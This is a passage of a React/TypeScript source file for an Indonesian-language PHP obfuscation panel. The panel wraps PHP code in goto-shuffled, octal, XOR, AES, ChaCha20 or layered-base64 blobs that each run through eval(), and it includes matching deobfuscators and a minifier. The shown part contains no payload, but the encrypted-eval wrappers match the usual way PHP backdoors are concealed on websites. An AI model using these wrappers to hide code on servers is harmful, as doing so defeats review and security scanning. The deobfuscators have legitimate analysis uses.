      setOutputB64_5(encoded);
      addHistory('URL to Base64 Encoder', 'Encoded URL', urlInput5);
    } catch (error: any) {
      alert("Error encoding URL: " + error.message);
    }
  };

  // TOOL 6: PHP Goto Obfuscator & Deobfuscator Handlers
  const handleGotoEncode = () => {
    setGotoError('');
    if (!gotoOutput.trim()) {
      setGotoError('Input kode kosong!');
      return;
    }

    try {
      const body = gotoOutput.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
      const twice = b64enc(b64enc(body));
      
      // Split twice into chunks of 8 characters
      const CHUNK_SIZE = 8;
      const chunks: string[] = [];
      for (let i = 0; i < twice.length; i += CHUNK_SIZE) {
        chunks.push(twice.slice(i, i + CHUNK_SIZE));
      }

      const N = chunks.length;
      if (N === 0) {
        setGotoError('Kode tidak valid atau terlalu pendek untuk diobfuscate!');
        return;
      }

      // Generate randomized labels using set for uniqueness
      const existingLabels = new Set<string>();
      const generateUniqueLabel = () => {
        const letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        let res = '';
        do {
          res = 'lbl_';
          for (let i = 0; i < 6; i++) {
            res += letters.charAt(Math.floor(Math.random() * letters.length));
          }
        } while (existingLabels.has(res));
        existingLabels.add(res);
        return res;
      };

      const labelInit = generateUniqueLabel();
      const labelExec = generateUniqueLabel();
      const labels: string[] = [];
      for (let i = 0; i < N; i++) {
        labels.push(generateUniqueLabel());
      }

      // Build goto blocks
      interface GotoBlock {
        label: string;
        code: string;
      }

      const blocks: GotoBlock[] = [];
      
      // 1. Init block
      blocks.push({
        label: labelInit,
        code: `${labelInit}:\n$g_parts = array();\ngoto ${labels[0]};`
      });

      // 2. Chunk blocks
      for (let i = 0; i < N; i++) {
        const nextLabel = i === N - 1 ? labelExec : labels[i + 1];
        blocks.push({
          label: labels[i],
          code: `${labels[i]}:\n$g_parts[${i}] = "${chunks[i]}";\ngoto ${nextLabel};`
        });
      }

      // 3. Exec block
      blocks.push({
        label: labelExec,
        code: `${labelExec}:\n$g_payload = implode("", $g_parts);\n$g_payload = base64_decode(base64_decode($g_payload));\neval($g_payload);`
      });

      // Shuffle blocks using Fisher-Yates
      const shuffled = [...blocks];
      for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        const temp = shuffled[i];
        shuffled[i] = shuffled[j];
        shuffled[j] = temp;
      }

      // Create final php goto script
      const phpResult = [
        '<?php',
        '// Obfuscated with PHP Goto Panel v1.5.0',
        `goto ${labelInit};`,
        '',
        shuffled.map(b => b.code).join('\n\n'),
        '?>'
      ].join('\n');

      setGotoInput(phpResult);
      addHistory('PHP Goto Obfuscator', 'Obfuscated standard PHP using goto jumps', body);
    } catch (e: any) {
      setGotoError("Gagal meng-encode: " + e.message);
    }
  };

  const handleGotoDecode = () => {
    setGotoError('');
    if (!gotoInput.trim()) {
      setGotoError('Input kode kosong!');
      return;
    }

    // Try to match array assignments with index: $variable[index] = "data";
    const re = /(?:\$([a-zA-Z_]\w*)\[(\d+)\]\s*=\s*["']([^"']+)["']\s*;)/g;
    let m;
    const partsMap: { [varName: string]: { [index: number]: string } } = {};

    while ((m = re.exec(gotoInput)) !== null) {
      const varName = m[1];
      const index = parseInt(m[2], 10);
      const data = m[3];
      
      if (!partsMap[varName]) {
        partsMap[varName] = {};
      }
      partsMap[varName][index] = cleanB64(data);
    }

    // Check if we found any valid array assignments
    const varNames = Object.keys(partsMap);
    if (varNames.length === 0) {
      // Fallback: search for simple base64 fragments
      const joinedFragments = collectFragments(gotoInput);
      if (joinedFragments) {
        try {
          let decoded = decodeSmart(joinedFragments);
          decoded = decoded.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
          setGotoOutput(decoded);
          addHistory('PHP Goto Deobfuscator', 'Deobfuscated standard php fragments', gotoInput);
          return;
        } catch (e) {}
      }
      setGotoError('Tidak menemukan baris fragment `$parts[index] = "....";` di dalam kode!');
      return;
    }

    // Sort by largest assignment count
    varNames.sort((a, b) => Object.keys(partsMap[b]).length - Object.keys(partsMap[a]).length);
    const mainVar = varNames[0];
    const indicesObj = partsMap[mainVar];
    const sortedIndices = Object.keys(indicesObj).map(Number).sort((a, b) => a - b);
    
    let joined = '';
    for (const idx of sortedIndices) {
      joined += indicesObj[idx];
    }

    try {
      let decoded = decodeSmart(joined);
      decoded = decoded.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
      setGotoOutput(decoded);
      addHistory('PHP Goto Deobfuscator', 'Deobfuscated PHP Goto payload', gotoInput);
    } catch (e: any) {
      setGotoError("Base64 decode gagal: " + e.message);
    }
  };

  // ---------------------------------------------------------
  // TOOL 7: PHP OCTAL OBFUSCATOR & DEOBFUSCATOR
  // ---------------------------------------------------------
  const handleOctalEncode = () => {
    setOctalError('');
    if (!octalOutput.trim()) {
      setOctalError('Input kode kosong!');
      return;
    }
    try {
      const body = octalOutput.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
      
      // Convert standard body directly to Octal escapes.
      let octalStr = '';
      for (let i = 0; i < body.length; i++) {
        const code = body.charCodeAt(i);
        const octVal = code.toString(8).padStart(3, '0');
        octalStr += '\\' + octVal;
      }
      
      const phpResult = [
        '<?php',
        '// Obfuscated with PHP Octal Panel v1.5.0',
        `eval("${octalStr}");`,
        '?>'
      ].join('\n');
      
      setOctalInput(phpResult);
      addHistory('PHP Octal Obfuscator', 'Obfuscated standard PHP using octal representation', body);
    } catch (e: any) {
      setOctalError("Gagal meng-encode: " + e.message);
    }
  };

  const handleOctalDecode = () => {
    setOctalError('');
    if (!octalInput.trim()) {
      setOctalError('Input kode kosong!');
      return;
    }
    try {
      // Find matches for \ooo where o is octal digit (0-7)
      // Look for content inside eval("...") or eval('...')
      const evalMatch = octalInput.match(/eval\s*\(\s*["']([\s\S]*?)["']\s*\)/i);
      let targetText = evalMatch ? evalMatch[1] : octalInput;
      
      // Replace all octal sequences with their character counterparts
      const decoded = targetText.replace(/\\([0-7]{3})/g, (match, octalNum) => {
        return String.fromCharCode(parseInt(octalNum, 8));
      }).replace(/\\([0-7]{1,2})/g, (match, octalNum) => {
        // Handle non-padded octals just in case
        return String.fromCharCode(parseInt(octalNum, 8));
      });
      
      if (decoded === targetText || !decoded.trim()) {
        setOctalError('Tidak dapat menemukan pola escape octal `\\xxx` yang valid!');
        return;
      }
      
      setOctalOutput(decoded.trim());
      addHistory('PHP Octal Deobfuscator', 'Deobfuscated octal payload', octalInput);
    } catch (e: any) {
      setOctalError("Gagal mende-decode: " + e.message);
    }
  };

  // ---------------------------------------------------------
  // TOOL 8: PHP XOR CIPHER OBFUSCATOR & DEOBFUSCATOR
  // ---------------------------------------------------------
  const handleXorEncode = () => {
    setXorError('');
    if (!xorOutput.trim()) {
      setXorError('Input kode kosong!');
      return;
    }
    const key = xorKey.trim() || 'gacor_xor_secret';
    try {
      const body = xorOutput.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
      
      const encoder = new TextEncoder();
      const bodyBytes = encoder.encode(body);
      const keyBytes = encoder.encode(key);
      
      const xorBytes = new Uint8Array(bodyBytes.length);
      for (let i = 0; i < bodyBytes.length; i++) {
        xorBytes[i] = bodyBytes[i] ^ keyBytes[i % keyBytes.length];
      }
      
      let bin = '';
      xorBytes.forEach(b => bin += String.fromCharCode(b));
      const base64Data = btoa(bin);
      
      const phpResult = [
        '<?php',
        '// Encrypted with PHP XOR Panel v1.5.0',
        `$k = "${key}";`,
        `$d = "${base64Data}";`,
        '$d = base64_decode($d);',
        '$r = "";',
        'for($i=0;$i<strlen($d);$i++){',
        '  $r .= $d[$i] ^ $k[$i % strlen($k)];',
        '}',
        'eval($r);',
        '?>'
      ].join('\n');
      
      setXorInput(phpResult);
      addHistory('PHP XOR Obfuscator', 'XOR-encrypted PHP code', body);
    } catch (e: any) {
      setXorError("Gagal meng-encode: " + e.message);
    }
  };

  const handleXorDecode = () => {
    setXorError('');
    if (!xorInput.trim()) {
      setXorError('Input kode kosong!');
      return;
    }
    try {
      const kRegex = /\$[kK](?:ey)?\s*=\s*["']([^"']+)["']/i;
      const dRegex = /\$[dD](?:ata)?\s*=\s*["']([A-Za-z0-9+/=_-]{4,})["']/i;
      
      const kM = xorInput.match(kRegex);
      const dM = xorInput.match(dRegex);
      
      let key = kM ? kM[1] : '';
      let base64Data = dM ? dM[1] : '';
      
      if (!key || !base64Data) {
        // Fallback string scanner
        const stringMatches = [...xorInput.matchAll(/["']([^"']+)["']/g)].map(m => m[1]);
        if (stringMatches.length >= 2) {
          key = stringMatches[0];
          // select the one that looks like base64
          const candidates = stringMatches.filter(s => /^[A-Za-z0-9+/=_-]{4,}$/.test(s) && s.length > 8);
          base64Data = candidates.length > 0 ? candidates[0] : stringMatches[1];
        }
      }
      
      if (!key || !base64Data) {
        setXorError('Gagal mendeteksi key atau ciphertext base64!');
        return;
      }
      
      const bin = atob(cleanB64(base64Data));
      const dataBytes = Uint8Array.from(bin, c => c.charCodeAt(0));
      const keyBytes = new TextEncoder().encode(key);
      
      const decBytes = new Uint8Array(dataBytes.length);
      for (let i = 0; i < dataBytes.length; i++) {
        decBytes[i] = dataBytes[i] ^ keyBytes[i % keyBytes.length];
      }
      
      const decoded = new TextDecoder().decode(decBytes);
      setXorOutput(decoded.trim());
      addHistory('PHP XOR Deobfuscator', 'Decrypted XOR ciphertext', xorInput);
    } catch (e: any) {
      setXorError("Gagal mende-decode: " + e.message);
    }
  };

  // ---------------------------------------------------------
  // TOOL 9: PHP AES-256-CBC OBFUSCATOR & DEOBFUSCATOR
  // ---------------------------------------------------------
  const encryptAES = async (text: string, keyStr: string, ivStr: string): Promise<string> => {
    const encoder = new TextEncoder();
    const dataBytes = encoder.encode(text);
    
    const keyBytesRaw = encoder.encode(keyStr);
    const paddedKey = new Uint8Array(32);
    paddedKey.set(keyBytesRaw.subarray(0, 32));
    
    const ivBytesRaw = encoder.encode(ivStr);
    const paddedIv = new Uint8Array(16);
    paddedIv.set(ivBytesRaw.subarray(0, 16));
    
    const cryptoKey = await window.crypto.subtle.importKey(
      "raw",
      paddedKey,
      { name: "AES-CBC" },
      false,
      ["encrypt"]
    );
    
    const encryptedBuffer = await window.crypto.subtle.encrypt(
      { name: "AES-CBC", iv: paddedIv },
      cryptoKey,
      dataBytes
    );
    
    const encryptedBytes = new Uint8Array(encryptedBuffer);
    let bin = '';
    encryptedBytes.forEach(b => bin += String.fromCharCode(b));
    return btoa(bin);
  };

  const decryptAES = async (ciphertextB64: string, keyStr: string, ivStr: string): Promise<string> => {
    const encoder = new TextEncoder();
    
    const keyBytesRaw = encoder.encode(keyStr);
    const paddedKey = new Uint8Array(32);
    paddedKey.set(keyBytesRaw.subarray(0, 32));
    
    const ivBytesRaw = encoder.encode(ivStr);
    const paddedIv = new Uint8Array(16);
    paddedIv.set(ivBytesRaw.subarray(0, 16));
    
    const bin = atob(ciphertextB64);
    const encryptedBytes = Uint8Array.from(bin, c => c.charCodeAt(0));
    
    const cryptoKey = await window.crypto.subtle.importKey(
      "raw",
      paddedKey,
      { name: "AES-CBC" },
      false,
      ["decrypt"]
    );
    
    const decryptedBuffer = await window.crypto.subtle.decrypt(
      { name: "AES-CBC", iv: paddedIv },
      cryptoKey,
      encryptedBytes
    );
    
    return new TextDecoder().decode(decryptedBuffer);
  };

  const handleAesEncode = async () => {
    setAesError('');
    if (!aesOutput.trim()) {
      setAesError('Input kode kosong!');
      return;
    }
    const key = aesKey.trim() || 'aes_secret_key_32_chars_long_gacor';
    const iv = aesIv.trim() || '1234567890123456';
    try {
      const body = aesOutput.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
      const ciphertext = await encryptAES(body, key, iv);
      
      const phpResult = [
        '<?php',
        '// Encrypted with PHP AES-256-CBC Panel v1.5.0',
        `$key = "${key}";`,
        `$iv = "${iv}";`,
        `$cipher = "${ciphertext}";`,
        '$dec = openssl_decrypt($cipher, "AES-256-CBC", $key, 0, $iv);',
        'eval($dec);',
        '?>'
      ].join('\n');
      
      setAesInput(phpResult);
      addHistory('PHP AES Obfuscator', 'AES-256-CBC encrypted PHP code', body);
    } catch (e: any) {
      setAesError("Gagal meng-encode: " + e.message);
    }
  };

  const handleAesDecode = async () => {
    setAesError('');
    if (!aesInput.trim()) {
      setAesError('Input kode kosong!');
      return;
    }
    try {
      const keyM = aesInput.match(/\$key\s*=\s*["']([^"']+)["']/i);
      const ivM = aesInput.match(/\$iv\s*=\s*["']([^"']+)["']/i);
      const cipherM = aesInput.match(/\$cipher\s*=\s*["']([A-Za-z0-9+/=_-]{4,})["']/i);
      
      let key = keyM ? keyM[1] : '';
      let iv = ivM ? ivM[1] : '';
      let ciphertext = cipherM ? cipherM[1] : '';
      
      if (!key || !ciphertext) {
        // Scan string array
        const strings = [...aesInput.matchAll(/["']([^"']+)["']/g)].map(m => m[1]);
        if (strings.length >= 3) {
          key = strings[0];
          iv = strings[1];
          const cipherCandidate = strings.filter(s => /^[A-Za-z0-9+/=_-]{4,}$/.test(s) && s.length > 12);
          ciphertext = cipherCandidate.length > 0 ? cipherCandidate[0] : strings[2];
        }
      }
      
      if (!key || !iv || !ciphertext) {
        setAesError('Gagal mendeteksi key, iv, atau ciphertext dalam kode!');
        return;
      }
      
      const decrypted = await decryptAES(ciphertext, key, iv);
      setAesOutput(decrypted.trim());
      addHistory('PHP AES Deobfuscator', 'Decrypted AES payload', aesInput);
    } catch (e: any) {
      setAesError("Gagal mende-decode: " + e.message);
    }
  };

  // ---------------------------------------------------------
  // TOOL 10: PHP CHACHA20 OBFUSCATOR & DEOBFUSCATOR
  // ---------------------------------------------------------
  const chacha20Block = (key: Uint8Array, nonce: Uint8Array, counter: number): Uint32Array => {
    const state = new Uint32Array(16);
    state[0] = 0x61707865; // "expa"
    state[1] = 0x3320646e; // "nd 3"
    state[2] = 0x79622d32; // "2-by"
    state[3] = 0x6b206574; // "te k"
    
    const view = new DataView(key.buffer, key.byteOffset, key.byteLength);
    for (let i = 0; i < 8; i++) {
      state[4 + i] = view.getUint32(i * 4, true);
    }
    
    state[12] = counter;
    const nonceView = new DataView(nonce.buffer, nonce.byteOffset, nonce.byteLength);
    if (nonce.length === 12) {
      state[13] = nonceView.getUint32(0, true);
      state[14] = nonceView.getUint32(4, true);
      state[15] = nonceView.getUint32(8, true);
    } else {
      state[12] = counter & 0xffffffff;
      state[13] = (counter / 0x100000000) & 0xffffffff;
      state[14] = nonceView.getUint32(0, true);
      state[15] = nonceView.getUint32(4, true);
    }
    
    const working = new Uint32Array(state);
    const rotl = (a: number, b: number) => (a << b) | (a >>> (32 - b));
    
    const qr = (a: number, b: number, c: number, d: number) => {
      working[a] += working[b]; working[d] ^= working[a]; working[d] = rotl(working[d], 16);
      working[c] += working[d]; working[b] ^= working[c]; working[b] = rotl(working[b], 12);
      working[a] += working[b]; working[d] ^= working[a]; working[d] = rotl(working[d], 8);
      working[c] += working[d]; working[b] ^= working[c]; working[b] = rotl(working[b], 7);
    };
    
    for (let i = 0; i < 10; i++) {
      qr(0, 4, 8, 12); qr(1, 5, 9, 13); qr(2, 6, 10, 14); qr(3, 7, 11, 15);
      qr(0, 5, 10, 15); qr(1, 6, 11, 12); qr(2, 7, 8, 13); qr(3, 4, 9, 14);
    }
    
    const result = new Uint32Array(16);
    for (let i = 0; i < 16; i++) {
      result[i] = state[i] + working[i];
    }
    return result;
  };

  const chacha20Encrypt = (data: Uint8Array, key: Uint8Array, nonce: Uint8Array): Uint8Array => {
    const out = new Uint8Array(data.length);
    let blockNum = 0;
    for (let i = 0; i < data.length; i += 64) {
      const block = chacha20Block(key, nonce, blockNum++);
      const blockBytes = new Uint8Array(block.buffer);
      const chunkLen = Math.min(64, data.length - i);
      for (let j = 0; j < chunkLen; j++) {
        out[i + j] = data[i + j] ^ blockBytes[j];
      }
    }
    return out;
  };

  const handleChachaEncode = () => {
    setChachaError('');
    if (!chachaOutput.trim()) {
      setChachaError('Input kode kosong!');
      return;
    }
    const key = chachaKey.trim() || 'chacha20_secret_key_32_chars_gacor';
    const iv = chachaIv.trim() || '12345678';
    try {
      const body = chachaOutput.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
      const encoder = new TextEncoder();
      
      const keyBytesRaw = encoder.encode(key);
      const keyBytes = new Uint8Array(32);
      keyBytes.set(keyBytesRaw.subarray(0, 32));
      
      const ivBytesRaw = encoder.encode(iv);
      const ivBytes = new Uint8Array(8);
      ivBytes.set(ivBytesRaw.subarray(0, 8));
      
      const bodyBytes = encoder.encode(body);
      const encBytes = chacha20Encrypt(bodyBytes, keyBytes, ivBytes);
      
      let bin = '';
      encBytes.forEach(b => bin += String.fromCharCode(b));
      const ciphertext = btoa(bin);
      
      const phpResult = [
        '<?php',
        '// Encrypted with PHP ChaCha20 Panel v1.5.0',
        `$key = "${key}";`,
        `$iv = "${iv}";`,
        `$cipher = "${ciphertext}";`,
        '$dec = openssl_decrypt($cipher, "chacha20", $key, 0, $iv);',
        'eval($dec);',
        '?>'
      ].join('\n');
      
      setChachaInput(phpResult);
      addHistory('PHP ChaCha20 Obfuscator', 'ChaCha20 encrypted PHP code', body);
    } catch (e: any) {
      setChachaError("Gagal meng-encode: " + e.message);
    }
  };

  const handleChachaDecode = () => {
    setChachaError('');
    if (!chachaInput.trim()) {
      setChachaError('Input kode kosong!');
      return;
    }
    try {
      const keyM = chachaInput.match(/\$key\s*=\s*["']([^"']+)["']/i);
      const ivM = chachaInput.match(/\$iv\s*=\s*["']([^"']+)["']/i);
      const cipherM = chachaInput.match(/\$cipher\s*=\s*["']([A-Za-z0-9+/=_-]{4,})["']/i);
      
      let key = keyM ? keyM[1] : '';
      let iv = ivM ? ivM[1] : '';
      let ciphertext = cipherM ? cipherM[1] : '';
      
      if (!key || !ciphertext) {
        const strings = [...chachaInput.matchAll(/["']([^"']+)["']/g)].map(m => m[1]);
        if (strings.length >= 3) {
          key = strings[0];
          iv = strings[1];
          const cipherCandidate = strings.filter(s => /^[A-Za-z0-9+/=_-]{4,}$/.test(s) && s.length > 8);
          ciphertext = cipherCandidate.length > 0 ? cipherCandidate[0] : strings[2];
        }
      }
      
      if (!key || !iv || !ciphertext) {
        setChachaError('Gagal mendeteksi key, iv, atau ciphertext dalam kode!');
        return;
      }
      
      const encoder = new TextEncoder();
      
      const keyBytesRaw = encoder.encode(key);
      const keyBytes = new Uint8Array(32);
      keyBytes.set(keyBytesRaw.subarray(0, 32));
      
      const ivBytesRaw = encoder.encode(iv);
      const ivBytes = new Uint8Array(8);
      ivBytes.set(ivBytesRaw.subarray(0, 8));
      
      const bin = atob(cleanB64(ciphertext));
      const cipherBytes = Uint8Array.from(bin, c => c.charCodeAt(0));
      
      const decBytes = chacha20Encrypt(cipherBytes, keyBytes, ivBytes);
      const decrypted = new TextDecoder().decode(decBytes);
      
      setChachaOutput(decrypted.trim());
      addHistory('PHP ChaCha20 Deobfuscator', 'Decrypted ChaCha20 payload', chachaInput);
    } catch (e: any) {
      setChachaError("Gagal mende-decode: " + e.message);
    }
  };

  // ---------------------------------------------------------
  // TOOL 11: PHP BASE64 OBFUSCATOR & DEOBFUSCATOR
  // ---------------------------------------------------------
  const handleB64Encode = () => {
    setB64Error('');
    if (!b64Output.trim()) {
      setB64Error('Input kode kosong!');
      return;
    }
    try {
      const body = b64Output.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
      let payload = body;
      const times = Math.min(Math.max(b64Times, 1), 10);

      for (let j = 0; j < times; j++) {
        const bytes = new TextEncoder().encode(payload);
        let bin = '';
        bytes.forEach(b => bin += String.fromCharCode(b));
        const b64 = btoa(bin);
        payload = `eval(base64_decode("${b64}"));`;
      }

      const phpResult = [
        '<?php',
        `// Obfuscated with PHP Base64 Panel v1.5.0 (${times}x layered)`,
        payload,
        '?>'
      ].join('\n');

      setB64Input(phpResult);
      addHistory('PHP Base64 Obfuscator', `Obfuscated standard PHP using base64 ${times}x layered`, body);
    } catch (e: any) {
      setB64Error("Gagal meng-encode: " + e.message);
    }
  };

  const handleB64Decode = () => {
    setB64Error('');
    if (!b64Input.trim()) {
      setB64Error('Input kode kosong!');
      return;
    }
    try {
      let current = b64Input.trim();
      let decodedSomething = false;
      let attempts = 0;

      while (attempts < 12) {
        const match = current.match(/base64_decode\s*\(\s*["']([A-Za-z0-9+/=_\-\r\n\s]+)["']\s*\)/i);
        if (match) {
          const b64Str = match[1].replace(/[\s\r\n]/g, ''); // strip any formatting
          try {
            const bin = atob(cleanB64(b64Str));
            const bytes = Uint8Array.from(bin, c => c.charCodeAt(0));
            current = new TextDecoder().decode(bytes);
            decodedSomething = true;
            attempts++;
          } catch (err) {
            break;
          }
        } else {
          // Check if there is an eval with standard string that is base64
          const stringMatch = current.match(/["']([A-Za-z0-9+/=_\-\r\n\s]{12,})["']/);
          if (stringMatch) {
            const b64Str = stringMatch[1].replace(/[\s\r\n]/g, '');
            try {
              const bin = atob(cleanB64(b64Str));
              const bytes = Uint8Array.from(bin, c => c.charCodeAt(0));
              const text = new TextDecoder().decode(bytes);
              if (text.includes('<?php') || text.includes('eval') || text.includes('$') || text.includes('function') || text.includes(';')) {
                current = text;
                decodedSomething = true;
                attempts++;
                continue;
              }
            } catch (err) {}
          }
          break;
        }
      }

      if (!decodedSomething) {
        // Fallback: try decoding whole input as base64
        try {
          const cleaned = cleanB64(current.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '').trim());
          const bin = atob(cleaned);
          const bytes = Uint8Array.from(bin, c => c.charCodeAt(0));
          current = new TextDecoder().decode(bytes);
          decodedSomething = true;
        } catch (err) {
          // ignore
        }
      }

      if (!decodedSomething) {
        setB64Error('Gagal mendeteksi pola base64_decode() yang valid atau string Base64!');
        return;
      }

      setB64Output(current.trim());
      addHistory('PHP Base64 Deobfuscator', 'Decoded Base64 payload', b64Input);
    } catch (e: any) {
      setB64Error("Gagal mende-decode: " + e.message);
    }
  };

  // ---------------------------------------------------------
  // TOOL 12: PHP SCRIPT SHORTENER & COMPRESSOR (MINIFIER)
  // ---------------------------------------------------------
  const handleShortenScript = () => {
    setShortenerError('');
    if (!shortenerInput.trim()) {
      setShortenerError('Input kode kosong!');
      return;
    }
    try {
      let code = shortenerInput.trim();
      
      // Determine if it has opening and closing tags
      const hasOpenTag = /^\s*<\?php/i.test(code);
      
      // We will perform a context-aware scan of the script
      // to safely strip comments and compact whitespaces
      // without destroying literal strings (single/double quotes)
      let result = '';
      let i = 0;
      let inSingleQuote = false;
      let inDoubleQuote = false;
      let inLineComment = false; // // or #
      let inBlockComment = false; // /* */
      
      while (i < code.length) {
        const char = code[i];
        const nextChar = code[i + 1] || '';
        const prevChar = i > 0 ? code[i - 1] : '';
        
        // Handle escaped characters inside strings
        if ((inSingleQuote || inDoubleQuote) && prevChar === '\\') {
          result += char;
          i++;
          continue;
        }
        
        // Handle single quote toggle
        if (!inDoubleQuote && !inLineComment && !inBlockComment) {
          if (char === "'") {
            inSingleQuote = !inSingleQuote;
            result += char;
            i++;
            continue;
          }
        }
        
        // Handle double quote toggle
        if (!inSingleQuote && !inLineComment && !inBlockComment) {
          if (char === '"') {
            inDoubleQuote = !inDoubleQuote;
            result += char;
            i++;
            continue;
          }
        }
        
        // Handle comments
        if (!inSingleQuote && !inDoubleQuote) {
          // Check for line comment //
          if (!inLineComment && !inBlockComment && char === '/' && nextChar === '/') {
            inLineComment = true;
            i += 2;
            continue;
          }
          // Check for line comment #
          if (!inLineComment && !inBlockComment && char === '#') {
            // make sure it's not a color code or string-like hashtag outside quotes (rare in PHP, but safe to strip as comment)
            inLineComment = true;
            i++;
            continue;
          }
          // Check for end of line comment
          if (inLineComment && (char === '\n' || char === '\r')) {
            inLineComment = false;
            // append single newline to separate statements if no semicolon exists
            result += '\n';
            i++;
            continue;
          }
          
          // Check for block comment /*
          if (!inLineComment && !inBlockComment && char === '/' && nextChar === '*') {
            inBlockComment = true;
            i += 2;
            continue;
          }
          // Check for end of block comment */
          if (inBlockComment && char === '*' && nextChar === '/') {
            inBlockComment = false;
            i += 2;
            continue;
          }
        }
        
        // If inside comment, skip
        if (inLineComment || inBlockComment) {
          i++;
          continue;
        }
        
        // Handle whitespaces outside strings
        if (!inSingleQuote && !inDoubleQuote) {
          if (/\s/.test(char)) {
            const lastAdded = result[result.length - 1] || '';
            
            // Find next non-whitespace char
            let nextNonWhitespace = '';
            let nextIdx = i + 1;
            while (nextIdx < code.length) {
              if (!/\s/.test(code[nextIdx])) {
                nextNonWhitespace = code[nextIdx];
                break;
              }
              nextIdx++;
            }
            
            // Only keep space if separating word boundaries (e.g. "echo $a", "return true", "function test")
            const isWordChar = (c: string) => /[a-zA-Z0-9_$]/.test(c);
            if (isWordChar(lastAdded) && isWordChar(nextNonWhitespace)) {
              result += ' ';
            }
            i++;
            continue;
          }
        }
        
        result += char;
        i++;
      }
      
      let finalized = result.trim();
      
      // Clean up multiple line breaks or consecutive spaces
      finalized = finalized.replace(/\n+/g, '\n').replace(/ {2,}/g, ' ');
      
      // Remove trailing semicolons before php close tags
      finalized = finalized.replace(/;\s*\?>/g, '?>');
      
      // Extreme compression: put everything on a single line!
      if (shortenerLevel === 'extreme') {
        finalized = finalized.replace(/\r?\n/g, ' ');
        // Clean up excess spacing around operators (e.g. "=", "=>", "==", "&&", "||", "+", "-", "(", ")", "{", "}")
        finalized = finalized.replace(/\s*([=\-+*\/%&|^!~<>:?,;{}()\[\]])\s*/g, '$1');
        // Ensure <?php has at least one trailing space or is intact
        if (/^<\?php[a-zA-Z0-9_$]/i.test(finalized)) {
          finalized = finalized.replace(/^<\?php/i, '<?php ');
        }
      }
      
      // Ensure the <?php tag is set up correctly
      if (hasOpenTag && !/^<\?php/i.test(finalized)) {
        if (finalized.startsWith('php')) {
          finalized = '<?' + finalized;
        } else {
          finalized = '<?php ' + finalized;
        }
      }
      
      setShortenerOutput(finalized);
      addHistory('PHP Script Shortener', `Shortened script using ${shortenerLevel === 'extreme' ? 'Extreme Single-Line' : 'Standard Minify'} mode`, code);
    } catch (e: any) {
      setShortenerError("Gagal memperpendek: " + e.message);
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-sans flex flex-col selection:bg-emerald-500 selection:text-slate-950">
      
      {/* BACKGROUND EFFECTS */}
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#0f172a_1px,transparent_1px),linear-gradient(to_bottom,#0f172a_1px,transparent_1px)] bg-[size:4rem_4rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_0%,#000_70%,transparent_100%)] pointer-events-none" />
      <div className="absolute top-0 right-1/4 w-96 h-96 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />
      <div className="absolute bottom-10 left-1/4 w-96 h-96 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none" />

      {/* HEADER BAR */}
      <header className="relative border-b border-slate-800 bg-slate-900/60 backdrop-blur-md px-6 py-4 flex items-center justify-between z-10">
        <div className="flex items-center space-x-3">
          <div className="bg-emerald-500/20 text-emerald-400 p-2 rounded-lg border border-emerald-500/30">
            <Terminal className="h-5 w-5" />
          </div>
          <div>
            <h1 className="text-lg font-bold tracking-tight text-white flex items-center gap-2">
              ADMIN WEB TOOLS PANEL
              <span className="text-xs px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-mono">
                v1.5.0
              </span>
            </h1>
            <p className="text-xs text-slate-400">Pusat Integrasi Alat Enkoder, Dekoder & Obfuscator PHP</p>
          </div>
        </div>

        {isLoggedIn && (
          <div className="flex items-center space-x-4">
            <div className="hidden md:flex items-center space-x-2 bg-slate-800/80 px-3 py-1.5 rounded-lg border border-slate-700">
              <UserCheck className="h-4 w-4 text-emerald-400" />
              <span className="text-xs text-slate-300 font-mono">
                Sesi: {gacor44Unlocked && gacor22Unlocked ? 'Full Master' : gacor44Unlocked ? 'Admin (gacor44)' : 'Admin (gacor22)'}
              </span>
            </div>
            
            <button
              onClick={handleLogout}
              className="flex items-center space-x-1 px-3 py-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/30 transition text-sm cursor-pointer"
            >
              <LogOut className="h-4 w-4" />
              <span className="hidden sm:inline">Logout</span>
            </button>
          </div>
        )}
      </header>

      {/* MAIN CONTAINER */}
      <main className="flex-1 w-full max-w-7xl mx-auto px-4 py-8 relative z-10 flex flex-col">
        <AnimatePresence mode="wait">
          
          {/* LOGIN SCREEN */}
          {!isLoggedIn ? (
            <motion.div
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -15 }}
              className="flex-1 flex flex-col justify-center items-center py-12"
            >
              <div className="w-full max-w-md bg-slate-900/80 border border-slate-800 rounded-2xl p-8 backdrop-blur-xl shadow-2xl relative overflow-hidden">
                <div className="absolute top-0 inset-x-0 h-1 bg-gradient-to-r from-emerald-500 via-teal-500 to-cyan-500" />
                
                <div className="text-center mb-8">
                  <div className="inline-flex items-center justify-center bg-slate-950 p-4 rounded-2xl border border-slate-800 shadow-inner mb-4">
                    <Shield className="h-8 w-8 text-emerald-400" />
                  </div>
                  <h2 className="text-2xl font-bold text-white tracking-tight uppercase">idoseo</h2>
                </div>

                <form onSubmit={handleLogin} className="space-y-5">
                  <div>
                    <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
                      Password Admin
                    </label>
                    <div className="relative rounded-lg shadow-sm">
                      <input
                        type={showPassword ? 'text' : 'password'}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Masukkan password..."
